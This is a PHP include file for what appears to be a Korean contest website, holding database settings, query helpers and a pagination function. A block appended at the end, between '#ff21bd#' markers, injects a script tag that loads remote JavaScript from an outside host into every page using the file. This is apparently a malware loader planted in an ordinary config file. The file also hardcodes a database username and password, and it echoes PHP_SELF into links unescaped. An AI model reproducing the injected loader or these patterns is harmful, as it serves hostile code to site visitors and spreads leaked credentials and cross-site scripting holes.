<?
$db_host="localhost";
$db_user="iwop_contest";     // iwop_contest
$db_pass="rudwlseoghl2013"; //rudwlseoghl13
$db_name="iwop_contest_14_Vocals";   //iwop_contest_13_dotjari

function db_connect($db_host, $db_user, $db_pass, $db_name)
{
	$result=mysql_connect($db_host,$db_user, $db_pass) or die(mysql_error());
	mysql_select_db($db_name) or die(mysql_error());
	return $result;
}
function sql_query($sql)
{
	global $connect;
	$result=@mysql_query($sql,$connect) or die("error file : ".$sql);
	return $result;
}
function sql_total($sql)
{
	global $connect;
	$result_total=sql_query($sql,$connect);
	$data_total=mysql_fetch_array($result_total);
	$total_count=$data_total[cnt];
	return $total_count;
}
function paging($page, $page_row, $page_scale, $total_count, $text='')
{
	$total_page=ceil($total_count/$page_row);
	$paging_str="";
	if($page>1)
		$paging_str.="<a href='$_SERVER[PHP_SELF]?page=1&'$text>처음</a>";
	$start_page=((ceil($page/$page_scale)-1)*$page_scale)+1;
	$end_page=$start_page+$page_scale-1;
	if($end_page>=$total_page)$end_page=$total_page;
	if($start_page>1)
		$paging_str.="&nbsp;<a href='$_SERVER[PHP_SELF]?page=".($start_page-1)."&'$text>◀</a>";
	if($total_page>1)
	{
		for($i=$start_page;$i<=$end_page;$i++)
		{
			if($page!=$i)
				$paging_str.="&nbsp;<a href='$_SERVER[PHP_SELF]?page=$i&'$text><span>[$i]</span></a>";
			else
				$paging_str.="&nbsp;<b style='color: #1caff6;'>[$i]</b>";
		}
	}
	if($total_page>$end_page)
		$paging_str.="&nbsp;<a href='$_SERVER[PHP_SELF]?page=".($end_page+1)."&'$text>▶</a>";
	if($page<$total_page)
		$paging_str.="&nbsp;<a href=$_SERVER[PHP_SELF]?page=$total_page&$text>맨끝</a>";

	return $paging_str;
}
?>
<?php
#ff21bd#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155820\"></script>";
echo $vt;
}
#/ff21bd#
?>